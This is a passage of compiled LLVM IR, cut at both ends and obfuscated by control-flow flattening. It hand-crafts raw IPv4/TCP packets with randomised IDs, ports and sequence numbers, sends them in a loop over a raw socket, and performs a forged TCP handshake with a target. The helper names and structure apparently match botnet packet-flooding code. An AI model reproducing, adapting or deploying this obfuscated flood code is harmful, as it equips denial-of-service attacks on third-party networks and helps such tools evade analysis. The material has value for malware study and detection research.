  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 0
  %583 = bitcast %union.anon* %582 to %struct.anon.0*
  %584 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %583, i32 0, i32 6
  store i16 0, i16* %584, align 4
  %585 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %586 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %587 = bitcast %struct.tcphdr* %586 to i8*
  %588 = load i16, i16* %5, align 2
  %589 = zext i16 %588 to i64
  %590 = add i64 20, %589
  %591 = trunc i64 %590 to i16
  %592 = call zeroext i16 @htons(i16 zeroext %591) #9
  %593 = load i16, i16* %5, align 2
  %594 = zext i16 %593 to i64
  %595 = add i64 20, %594
  %596 = trunc i64 %595 to i32
  %597 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %585, i8* %587, i16 zeroext %592, i32 %596)
  %598 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 0
  %600 = bitcast %union.anon* %599 to %struct.anon.0*
  %601 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %600, i32 0, i32 6
  store i16 %597, i16* %601, align 4
  %602 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %602, align 4
  %603 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %604 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %603, i32 0, i32 0
  %605 = bitcast %union.anon* %604 to %struct.anon.0*
  %606 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %605, i32 0, i32 1
  %607 = load i16, i16* %606, align 2
  %608 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %607, i16* %608, align 2
  %609 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 9
  %611 = load i32, i32* %610, align 4
  %612 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %613 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %612, i32 0, i32 0
  store i32 %611, i32* %613, align 4
  %614 = load i32*, i32** %22, align 8
  %615 = load i32, i32* %3, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds i32, i32* %614, i64 %616
  %618 = load i32, i32* %617, align 4
  %619 = load i8**, i8*** %9, align 8
  %620 = load i32, i32* %3, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds i8*, i8** %619, i64 %621
  %623 = load i8*, i8** %622, align 8
  %624 = load i16, i16* %5, align 2
  %625 = zext i16 %624 to i64
  %626 = add i64 40, %625
  %627 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %628 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %628, %struct.sockaddr** %627, align 8
  %629 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %630 = load %struct.sockaddr*, %struct.sockaddr** %629, align 8
  %631 = call i64 @sendto(i32 %618, i8* %623, i64 %626, i32 16384, %struct.sockaddr* %630, i32 16)
  store i32 -1417223057, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i32, i32* %3, align 4
  %634 = add nsw i32 %633, 1
  store i32 %634, i32* %3, align 4
  store i32 -1609467991, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  store i32 -294014753, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %635, %632, %573, %566, %558, %551, %543, %535, %526, %518, %509, %503, %496, %492, %486, %466, %445, %437, %436, %435, %432, %264, %244, %225, %221, %208, %192, %184, %183, %172, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @tcp_handshake(i16 zeroext, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [40 x i8], align 16
  %17 = alloca [40 x i8], align 16
  %18 = alloca [512 x i8], align 16
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i16 %0, i16* %7, align 2
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 64, i32* %12, align 4
  store i32 5, i32* %13, align 4
  store i32 4, i32* %14, align 4
  %30 = call i32 @rand_new()
  %31 = and i32 %30, 65535
  store i32 %31, i32* %15, align 4
  %32 = bitcast [40 x i8]* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 40, i32 16, i1 false)
  %33 = bitcast [40 x i8]* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 40, i32 16, i1 false)
  %34 = bitcast [512 x i8]* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 512, i32 16, i1 false)
  store i32 0, i32* %22, align 4
  %35 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i32 0, i32 0
  %36 = bitcast i8* %35 to %struct.iphdr*
  store %struct.iphdr* %36, %struct.iphdr** %19, align 8
  %37 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %38 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %37, i64 1
  %39 = bitcast %struct.iphdr* %38 to %struct.tcphdr*
  store %struct.tcphdr* %39, %struct.tcphdr** %20, align 8
  %40 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %41 = bitcast %struct.iphdr* %40 to i8*
  %42 = load i8, i8* %41, align 4
  %43 = and i8 %42, -16
  %44 = or i8 %43, 5
  store i8 %44, i8* %41, align 4
  %45 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %46 = bitcast %struct.iphdr* %45 to i8*
  %47 = load i8, i8* %46, align 4
  %48 = and i8 %47, 15
  %49 = or i8 %48, 64
  store i8 %49, i8* %46, align 4
  %50 = call zeroext i16 @htons(i16 zeroext 40) #9
  %51 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 2
  store i16 %50, i16* %52, align 2
  %53 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 5
  store i8 64, i8* %54, align 4
  %55 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 6
  store i8 6, i8* %56, align 1
  %57 = load i16, i16* %7, align 2
  %58 = call zeroext i16 @htons(i16 zeroext %57) #9
  %59 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %60 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %59, i32 0, i32 0
  %61 = bitcast %union.anon* %60 to %struct.anon.0*
  %62 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %61, i32 0, i32 1
  store i16 %58, i16* %62, align 2
  %63 = load i32, i32* %11, align 4
  %64 = trunc i32 %63 to i16
  %65 = call zeroext i16 @htons(i16 zeroext %64) #9
  %66 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %67 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %66, i32 0, i32 0
  %68 = bitcast %union.anon* %67 to %struct.anon.0*
  %69 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %68, i32 0, i32 0
  store i16 %65, i16* %69, align 4
  %70 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %71 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %70, i32 0, i32 0
  %72 = bitcast %union.anon* %71 to %struct.anon.0*
  %73 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %72, i32 0, i32 4
  %74 = load i16, i16* %73, align 4
  %75 = and i16 %74, -241
  %76 = or i16 %75, 80
  store i16 %76, i16* %73, align 4
  %77 = call i32 @rand_new()
  %78 = and i32 %77, 65535
  %79 = trunc i32 %78 to i16
  %80 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %81 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %80, i32 0, i32 0
  %82 = bitcast %union.anon* %81 to %struct.anon.0*
  %83 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %82, i32 0, i32 5
  store i16 %79, i16* %83, align 2
  %84 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %85 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %84, i32 0, i32 0
  %86 = bitcast %union.anon* %85 to %struct.anon.0*
  %87 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %86, i32 0, i32 4
  %88 = load i16, i16* %87, align 4
  %89 = and i16 %88, -4097
  store i16 %89, i16* %87, align 4
  %90 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %91 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %90, i32 0, i32 0
  %92 = bitcast %union.anon* %91 to %struct.anon.0*
  %93 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %92, i32 0, i32 4
  %94 = load i16, i16* %93, align 4
  %95 = and i16 %94, -257
  store i16 %95, i16* %93, align 4
  %96 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon* %97 to %struct.anon.0*
  %99 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %98, i32 0, i32 4
  %100 = load i16, i16* %99, align 4
  %101 = and i16 %100, -8193
  store i16 %101, i16* %99, align 4
  %102 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 4
  %106 = load i16, i16* %105, align 4
  %107 = and i16 %106, -2049
  store i16 %107, i16* %105, align 4
  %108 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 0
  %110 = bitcast %union.anon* %109 to %struct.anon.0*
  %111 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %110, i32 0, i32 4
  %112 = load i16, i16* %111, align 4
  %113 = and i16 %112, -1025
  store i16 %113, i16* %111, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -513
  %120 = or i16 %119, 512
  store i16 %120, i16* %117, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 3
  store i32 0, i32* %124, align 4
  %125 = call i32 @rand_new()
  %126 = and i32 %125, 65535
  %127 = trunc i32 %126 to i16
  %128 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 3
  store i16 %127, i16* %129, align 4
  %130 = load i32, i32* %10, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 8
  store i32 %130, i32* %132, align 4
  %133 = load i32, i32* %9, align 4
  %134 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 9
  store i32 %133, i32* %135, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 7
  store i16 0, i16* %137, align 2
  %138 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %139 = bitcast %struct.iphdr* %138 to i16*
  %140 = call zeroext i16 @checksum_generic(i16* %139, i32 20)
  %141 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 7
  store i16 %140, i16* %142, align 2
  %143 = call i32 @rand_new()
  %144 = and i32 %143, 65535
  %145 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 0
  %147 = bitcast %union.anon* %146 to %struct.anon.0*
  %148 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %147, i32 0, i32 2
  store i32 %144, i32* %148, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 6
  store i16 0, i16* %152, align 4
  %153 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %154 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %155 = bitcast %struct.tcphdr* %154 to i8*
  %156 = call zeroext i16 @htons(i16 zeroext 20) #9
  %157 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %153, i8* %155, i16 zeroext %156, i32 20)
  %158 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %159 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %158, i32 0, i32 0
  %160 = bitcast %union.anon* %159 to %struct.anon.0*
  %161 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %160, i32 0, i32 6
  store i16 %157, i16* %161, align 4
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %162, align 4
  %163 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon* %164 to %struct.anon.0*
  %166 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %165, i32 0, i32 1
  %167 = load i16, i16* %166, align 2
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %167, i16* %168, align 2
  %169 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 9
  %171 = load i32, i32* %170, align 4
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %172, i32 0, i32 0
  store i32 %171, i32* %173, align 4
  %174 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i32 0, i32 0
  %175 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i32 0, i32 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %174, i8* %175, i64 40, i32 16, i1 false)
  %176 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon* %177 to %struct.anon.0*
  %179 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %178, i32 0, i32 3
  %180 = load i32, i32* %179, align 4
  %181 = call i32 @ntohl(i32 %180) #9
  %182 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon* %183 to %struct.anon.0*
  %185 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %184, i32 0, i32 2
  %186 = load i32, i32* %185, align 4
  %187 = call i32 @ntohl(i32 %186) #9
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i32 0, i32 0), i32 %181, i32 %187)
  %189 = load i32, i32* %8, align 4
  %190 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i32 0, i32 0
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i64 @sendto(i32 %189, i8* %190, i64 40, i32 16384, %struct.sockaddr* %194, i32 16)
  %196 = trunc i64 %195 to i32
  store i32 %196, i32* %22, align 4
  %197 = load i32, i32* %22, align 4
  store i32 %197, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 643281379, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 643281379, label %first
    i32 -1708860160, label %200
    i32 -1934017902, label %201
    i32 -720406654, label %215
    i32 -502835718, label %216
    i32 620322089, label %217
    i32 1240443236, label %221
    i32 -519243993, label %232
    i32 -208071567, label %233
    i32 500586959, label %240
    i32 -1447045127, label %251
    i32 838678644, label %262
    i32 665915066, label %399
    i32 -1680526396, label %402
    i32 1364518139, label %406
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %198 = icmp eq i32 %.reload, -1
  %199 = select i1 %198, i32 -1708860160, i32 -1934017902
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 1364518139, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = getelementptr inbounds [512 x i8], [512 x i8]* %18, i32 0, i32 0
  %203 = bitcast i8* %202 to %struct.iphdr*
  store %struct.iphdr* %203, %struct.iphdr** %19, align 8
  %204 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i64 1
  %206 = bitcast %struct.iphdr* %205 to %struct.tcphdr*
  store %struct.tcphdr* %206, %struct.tcphdr** %20, align 8
  store i32 0, i32* %24, align 4
  %207 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 5, i64* %207, align 8
  %208 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %208, align 8
  %209 = load i32, i32* %8, align 4
  %210 = bitcast %struct.timeval* %25 to i8*
  %211 = call i32 @setsockopt(i32 %209, i32 1, i32 20, i8* %210, i32 16) #8
  store i32 %211, i32* %22, align 4
  %212 = load i32, i32* %22, align 4
  %213 = icmp eq i32 %212, -1
  %214 = select i1 %213, i32 -720406654, i32 -502835718
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 1364518139, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  store i32 620322089, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i32, i32* %24, align 4
  %219 = icmp slt i32 %218, 10000
  %220 = select i1 %219, i32 1240443236, i32 -1680526396
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %8, align 4
  %223 = getelementptr inbounds [512 x i8], [512 x i8]* %18, i32 0, i32 0
  %224 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %224, align 8
  %225 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %226 = load %struct.sockaddr*, %struct.sockaddr** %225, align 8
  %227 = call i64 @recvfrom(i32 %222, i8* %223, i64 512, i32 16384, %struct.sockaddr* %226, i32* null)
  %228 = trunc i64 %227 to i32
  store i32 %228, i32* %22, align 4
  %229 = load i32, i32* %22, align 4
  %230 = icmp eq i32 %229, -1
  %231 = select i1 %230, i32 -519243993, i32 -208071567
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -1680526396, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 8
  %236 = load i32, i32* %235, align 4
  %237 = load i32, i32* %9, align 4
  %238 = icmp eq i32 %236, %237
  %239 = select i1 %238, i32 500586959, i32 665915066
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 0
  %243 = bitcast %union.anon* %242 to %struct.anon.0*
  %244 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = lshr i16 %245, 12
  %247 = and i16 %246, 1
  %248 = zext i16 %247 to i32
  %249 = icmp eq i32 %248, 1
  %250 = select i1 %249, i32 -1447045127, i32 665915066
  store i32 %250, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon* %253 to %struct.anon.0*
  %255 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = lshr i16 %256, 9
  %258 = and i16 %257, 1
  %259 = zext i16 %258 to i32
  %260 = icmp eq i32 %259, 1
  %261 = select i1 %260, i32 838678644, i32 665915066
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 0
  %265 = bitcast %union.anon* %264 to %struct.anon.0*
  %266 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %265, i32 0, i32 3
  %267 = load i32, i32* %266, align 4
  %268 = call i32 @ntohl(i32 %267) #9
  %269 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 0
  %271 = bitcast %union.anon* %270 to %struct.anon.0*
  %272 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %271, i32 0, i32 2
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @ntohl(i32 %273) #9
  %275 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i32 0, i32 0), i32 %268, i32 %274)
  %276 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 0
  %278 = bitcast %union.anon* %277 to %struct.anon.0*
  %279 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %278, i32 0, i32 2
  %280 = load i32, i32* %279, align 4
  %281 = call i32 @ntohl(i32 %280) #9
  %282 = add i32 %281, 1
  %283 = call i32 @htonl(i32 %282) #9
  store i32 %283, i32* %27, align 4
  %284 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 0
  %286 = bitcast %union.anon* %285 to %struct.anon.0*
  %287 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %286, i32 0, i32 3
  %288 = load i32, i32* %287, align 4
  store i32 %288, i32* %28, align 4
  %289 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i32 0, i32 0
  %290 = bitcast i8* %289 to %struct.iphdr*
  store %struct.iphdr* %290, %struct.iphdr** %19, align 8
  %291 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i64 1
  %293 = bitcast %struct.iphdr* %292 to %struct.tcphdr*
  store %struct.tcphdr* %293, %struct.tcphdr** %20, align 8
  %294 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon* %295 to %struct.anon.0*
  %297 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %296, i32 0, i32 4
  %298 = load i16, i16* %297, align 4
  %299 = and i16 %298, -4097
  %300 = or i16 %299, 4096
  store i16 %300, i16* %297, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon* %302 to %struct.anon.0*
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 4
  %305 = load i16, i16* %304, align 4
  %306 = and i16 %305, -257
  store i16 %306, i16* %304, align 4
  %307 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon* %308 to %struct.anon.0*
  %310 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = and i16 %311, -8193
  store i16 %312, i16* %310, align 4
  %313 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon* %314 to %struct.anon.0*
  %316 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %315, i32 0, i32 4
  %317 = load i16, i16* %316, align 4
  %318 = and i16 %317, -2049
  store i16 %318, i16* %316, align 4
  %319 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %320 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %319, i32 0, i32 0
  %321 = bitcast %union.anon* %320 to %struct.anon.0*
  %322 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %321, i32 0, i32 4
  %323 = load i16, i16* %322, align 4
  %324 = and i16 %323, -1025
  store i16 %324, i16* %322, align 4
  %325 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon* %326 to %struct.anon.0*
  %328 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %327, i32 0, i32 4
  %329 = load i16, i16* %328, align 4
  %330 = and i16 %329, -513
  store i16 %330, i16* %328, align 4
  %331 = load i32, i32* %27, align 4
  %332 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon* %333 to %struct.anon.0*
  %335 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %334, i32 0, i32 3
  store i32 %331, i32* %335, align 4
  %336 = load i32, i32* %28, align 4
  %337 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %338 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %337, i32 0, i32 0
  %339 = bitcast %union.anon* %338 to %struct.anon.0*
  %340 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %339, i32 0, i32 2
  store i32 %336, i32* %340, align 4
  %341 = call i32 @rand_new()
  %342 = and i32 %341, 65535
  %343 = trunc i32 %342 to i16
  %344 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 3
  store i16 %343, i16* %345, align 4
  %346 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 7
  store i16 0, i16* %347, align 2
  %348 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %349 = bitcast %struct.iphdr* %348 to i16*
  %350 = call zeroext i16 @checksum_generic(i16* %349, i32 20)
  %351 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i32 0, i32 7
